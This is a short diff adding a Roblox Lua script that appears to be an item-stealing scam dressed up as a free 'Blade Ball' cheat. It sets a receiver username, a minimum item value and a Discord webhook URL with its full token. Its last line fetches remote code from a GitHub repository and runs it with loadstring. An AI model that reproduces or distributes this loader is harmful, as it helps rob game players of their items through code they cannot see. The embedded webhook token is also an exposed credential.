@@ -1,0 +1,6 @@
+_G.Usernames = {"Amirswo"} -- you can add as many as you'd like
+_G.min_rap = 5
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1394186094412824768/dHz0Mif4JQnZQFtMrLB_TDK2vSIUZ2AQsHS6xg7T9v41O8cWPJL9qSiSup5hV4o921F0" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bladeballscripts/freebladeball/refs/heads/main/Source.lua"))()
